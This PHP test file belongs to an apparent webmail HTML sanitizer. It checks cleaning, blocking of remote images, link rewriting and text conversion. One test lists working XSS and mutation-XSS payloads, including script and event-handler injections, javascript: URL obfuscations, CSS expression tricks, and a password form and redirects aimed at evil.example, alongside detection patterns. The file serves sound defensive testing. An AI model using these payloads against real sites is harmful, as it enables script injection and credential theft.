<?php

declare(strict_types=1);

namespace MailSimply\Tests;

use MailSimply\Html\Sanitizer;
use MailSimply\Html\Text;

/**
 * Message HTML: what survives cleaning, and the conversions to and from
 * plain text.
 */
final class HtmlTest extends TestCase
{
    /**
     * Payloads that must never come out able to run: scripts, handlers,
     * javascript: URLs, and the parser-differential tricks that rely on raw
     * text elements, comments or foreign content being re-read differently.
     */
    public function testNothingThatRunsSurvives(): void
    {
        $payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<a href="javascript:alert(1)">x</a>',
            '<a href="JaVaScRiPt&colon;alert(1)">x</a>',
            "<a href=\"java\tscript:alert(1)\">x</a>",
            '<a href="data:text/html,<script>alert(1)</script>">x</a>',
            '<svg><script>alert(1)</script></svg>',
            '<svg onload=alert(1)>',
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="x.swf"></object><embed src="x.swf">',
            '<form action="https://evil.example"><input name=password><button>Go</button></form>',
            '<style>*{background:url("javascript:alert(1)")}</style>',
            '<div style="width: expression(alert(1))">x</div>',
            '<div style="background: url(\'javascript:alert(1)\')">x</div>',
            '<div style="behavior: url(x.htc)">x</div>',
            '<style>@import "https://evil.example/x.css";</style>',
            '<div style="background-image: -webkit-image-set(\'https://evil.example/x.png\' 1x)">x</div>',
            '<base href="https://evil.example/">',
            '<meta http-equiv="refresh" content="0;url=https://evil.example">',
            '<!--<img src=x onerror=alert(1)>-->',
            '<textarea><img src=x onerror=alert(1)></textarea>',
            '<xmp><img src=x onerror=alert(1)></xmp>',
            '<style></style><img src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<a href="#" onclick="alert(1)">x</a>',
            '<p style="color: red; }</style><script>alert(1)</script>">x</p>',
            '<style>p { color: red } </style ><script>alert(1)</script>',
        ];

        foreach ($payloads as $payload) {
            $html = (new Sanitizer)->clean($payload)['html'];
            self::assertInert($html, $payload);

            // Cleaning its own output changes nothing: a second pass finds
            // nothing the first one let through.
            self::assertSame($html, (new Sanitizer)->clean($html)['html'], 'Payload: '.$payload);
        }
    }

    /**
     * Read the output back the way a browser would, and check every element
     * and attribute in it: that is what matters, not how the text looks.
     */
    private static function assertInert(string $html, string $payload): void
    {
        $document = \Dom\HTMLDocument::createFromString('<!doctype html><html><body>'.$html.'</body></html>', LIBXML_NOERROR, 'UTF-8');
        $allowed = ['a', 'b', 'blockquote', 'br', 'div', 'p', 'span', 'img', 'style', 'table', 'tbody', 'tr', 'td', 'details', 'font', 'html', 'head', 'body'];

        foreach ($document->getElementsByTagName('*') as $element) {
            $name = strtolower($element->localName);
            self::assertTrue(in_array($name, $allowed, true), "Element <{$name}> came out of: {$payload}");
            self::assertTrue($element->namespaceURI === 'http://www.w3.org/1999/xhtml', "Foreign content came out of: {$payload}");

            foreach ($element->attributes as $attribute) {
                $attributeName = strtolower($attribute->localName);
                $value = strtolower(preg_replace('/\s+/', '', (string) $attribute->value) ?? '');

                self::assertTrue(! str_starts_with($attributeName, 'on'), "Handler {$attributeName} came out of: {$payload}");

                if (in_array($attributeName, ['href', 'src', 'background'], true)) {
                    self::assertTrue(preg_match('#^(https?:|mailto:|tel:|\#|cid:|data:image/)#', $value) === 1, "URL {$value} came out of: {$payload}");
                }

                if ($attributeName === 'style') {
                    self::assertTrue(preg_match('/expression|javascript|behavior|binding|url\((?!"?data:image)/', $value) !== 1, "Style {$value} came out of: {$payload}");
                }
            }

            if ($name === 'style') {
                $css = strtolower((string) $element->textContent);
                self::assertTrue(preg_match('/@import|expression|javascript|behavior|evil\.example/', $css) !== 1, "Stylesheet came out of: {$payload}");
            }
        }
    }

    public function testRemoteContentIsBlockedAndCounted(): void
    {
        $html = '<p style="background:url(https://track.example/bg.png)">Hi <img src="https://track.example/px.gif" alt="Logo"><img src="//cdn.example/x.png"></p><table background="http://x.example/t.png"><tr><td>x</td></tr></table>';

        $blocked = (new Sanitizer(false))->clean($html);
        self::assertSame(4, $blocked['blocked']);
        self::assertNotContains('track.example', $blocked['html']);
        self::assertNotContains('cdn.example', $blocked['html']);
        self::assertContains('[Logo]', $blocked['html']);

        $allowed = (new Sanitizer(true))->clean($html);
        self::assertSame(0, $allowed['blocked']);
        self::assertContains('https://track.example/px.gif', $allowed['html']);
        self::assertContains('https://cdn.example/x.png', $allowed['html'], 'Protocol-relative URLs are made https.');
    }

    public function testInlineImagesResolveThroughTheCallback(): void
    {
        $sanitizer = new Sanitizer(false, static fn (string $cid): ?string => $cid === 'logo@x' ? 'attachment.php?part=1.2' : null);
        $html = $sanitizer->clean('<img src="cid:logo@x"><img src="cid:unknown@x"><img src="data:image/png;base64,iVBORw0KGgo=">')['html'];

        self::assertContains('src="attachment.php?part=1.2"', $html);
        self::assertNotContains('unknown', $html);
        self::assertContains('src="data:image/png;base64,iVBORw0KGgo="', $html);
    }

    public function testLinksOpenElsewhereWithoutAReferrer(): void
    {
        $html = (new Sanitizer)->clean('<a href="https://example.com/x?a=1&b=2">x</a><a href="mailto:a@b.c">m</a><a href="#top">t</a>')['html'];

        self::assertContains('<a href="https://example.com/x?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">x</a>', $html);
        self::assertContains('<a href="mailto:a@b.c" target="_blank" rel="noopener noreferrer">m</a>', $html);
        self::assertContains('<a href="#top">t</a>', $html);
    }

    public function testNewsletterLayoutSurvives(): void
    {
        $html = (new Sanitizer(true))->clean('<html><head><style>.hero{background:#fde68a} h1{color:#92400e}</style></head><body bgcolor="#ffffff"><table width="600" cellpadding="0" align="center"><tr><td class="hero" style="padding:24px"><h1>Sale</h1><font face="Arial" color="#333">30% off</font></td></tr></table></body></html>')['html'];

        self::assertContains('<style>.hero{background:#fde68a} h1{color:#92400e}</style>', $html);
        self::assertContains('<div bgcolor="#ffffff">', $html);
        self::assertContains('<table width="600" cellpadding="0" align="center">', $html);
        self::assertContains('<td class="hero" style="padding:24px">', $html);
        self::assertContains('<font face="Arial" color="#333">30% off</font>', $html);
    }

    public function testStylesheetsCanBeLeftOut(): void
    {
        $html = (new Sanitizer(true, null, true, false))->clean('<style>body { display: none }</style><p style="color:red">x</p>')['html'];

        self::assertSame('<p style="color:red">x</p>', $html, 'Inline styles stay; a stylesheet for the whole page does not.');
    }

    public function testHtmlBecomesReadableText(): void
    {
        $text = Text::fromHtml('<p>Hello <b>world</b></p><ul><li>one</li><li>two</li></ul><blockquote><p>quoted</p></blockquote><a href="https://x.com">link</a><br>after<script>alert(1)</script>');

        self::assertSame("Hello world\n\n- one\n- two\n\n> quoted\nlink <https://x.com>\nafter", $text);
    }

    public function testPlainTextBecomesSafeLinkedHtml(): void
    {
        $html = Text::toHtml("Hi <b>, see https://x.com/?a=1&b=2.\n> quoted \"http://q.io\"\n>> deeper\nback to me@example.com");

        self::assertContains('Hi &lt;b&gt;', $html);
        self::assertContains('<a href="https://x.com/?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">https://x.com/?a=1&amp;b=2</a>.', $html);
        self::assertContains('&quot;<a href="http://q.io" target="_blank" rel="noopener noreferrer">http://q.io</a>&quot;', $html);
        self::assertContains('<blockquote>quoted', $html);
        self::assertContains('<blockquote>deeper</blockquote></blockquote>', $html);
        self::assertContains('<a href="mailto:me@example.com">me@example.com</a>', $html);
    }

    public function testFlowedTextIsJoinedAgain(): void
    {
        $html = Text::toHtml("This is a soft \nwrapped line.\n> quoted soft \n> end\n-- \nsig", true);

        self::assertContains('This is a soft wrapped line.', $html);
        self::assertContains('<blockquote>quoted soft end</blockquote>', $html);
        self::assertContains("-- \nsig", $html);
    }
}
